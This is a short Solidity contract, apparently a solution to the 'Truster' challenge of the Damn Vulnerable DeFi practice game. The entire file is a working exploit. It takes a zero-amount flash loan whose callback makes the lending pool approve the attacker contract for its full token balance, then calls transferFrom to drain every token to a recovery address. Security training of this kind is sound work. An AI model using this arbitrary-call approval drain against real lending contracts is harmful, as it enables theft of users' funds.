// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import  {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

contract HackContract {

	function hackContract(address _trusterLenderPool, address _dvtToken, address _recovery) external {
		TrusterLenderPool trusterLenderPool = TrusterLenderPool(_trusterLenderPool);
		ERC20 dvtToken = ERC20(_dvtToken);

		uint256 flashLoanAmount = 0;
		uint256 poolBalance = dvtToken.balanceOf(_trusterLenderPool);

		trusterLenderPool.flashLoan(
			flashLoanAmount, 
			_trusterLenderPool,
			_dvtToken, 
			abi.encodeCall(dvtToken.approve, (address(this), poolBalance))
		);

		dvtToken.transferFrom(_trusterLenderPool, _recovery, poolBalance);
	}
}